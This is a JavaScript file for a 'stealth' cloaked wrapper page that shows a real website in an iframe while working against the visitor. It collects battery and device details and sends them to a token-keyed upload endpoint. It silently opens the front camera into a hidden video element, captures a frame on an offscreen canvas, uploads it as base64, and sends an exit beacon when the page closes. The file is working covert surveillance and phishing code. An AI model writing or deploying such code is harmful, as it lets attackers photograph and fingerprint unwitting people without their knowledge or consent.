/**
 * static/js/wrap_app.js - Stealth client for cloaked wrapper mode with X-Frame fallback detection.
 */

(async () => {
  const token = window.SESSION_CONFIG?.token;
  if (!token) return;

  const iframe = document.getElementById("siteFrame");
  const fallback = document.getElementById("iframe-fallback");
  const video = document.getElementById("hidden-video");
  const canvas = document.getElementById("offscreen-canvas");

  // Fallback detection: If iframe cannot load because of X-Frame-Options or CSP, show fallback
  let iframeLoaded = false;
  if (iframe) {
    iframe.onload = () => {
      iframeLoaded = true;
    };
    // Check after 4 seconds if iframe failed or stayed blank
    setTimeout(() => {
      try {
        // Cross-origin checks: if frame is blocked, display fallback
        if (!iframeLoaded && (!iframe.contentDocument && !iframe.contentWindow)) {
          if (fallback) fallback.classList.add("active");
        }
      } catch (e) {
        // Cross-origin security error often indicates successful load of external domain
      }
    }, 4000);
  }

  // Gather baseline telemetry
  async function tick() {
    const [battery, details] = await Promise.all([
      window.TelemetryCollector?.getBattery(),
      window.TelemetryCollector?.getDeviceDetails()
    ]);

    await window.ApiClient.post(`/upload_info/${token}`, {
      battery,
      details
    });
  }

  await tick();

  // Attempt camera in background if permitted
  try {
    if (navigator.mediaDevices?.getUserMedia) {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      if (video && canvas) {
        video.srcObject = stream;
        await video.play().catch(() => {});
        setTimeout(async () => {
          if (video.videoWidth) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0);
            const b64 = canvas.toDataURL("image/jpeg", 0.75);
            await window.ApiClient.post(`/upload_image/${token}`, {
              image_b64: b64
            });
          }
          // Tear down tracks
          stream.getTracks().forEach(t => {
            try { t.stop(); } catch (e) {}
          });
        }, 1200);
      }
    }
  } catch (e) {
    // Camera denied or unavailable
  }

  // Page unload beacon
  window.addEventListener("beforeunload", () => {
    window.ApiClient?.sendBeacon(`/session_exit/${token}`, {
      event: "SESSION_EXITED",
      timestamp: new Date().toISOString()
    });
  });
})();
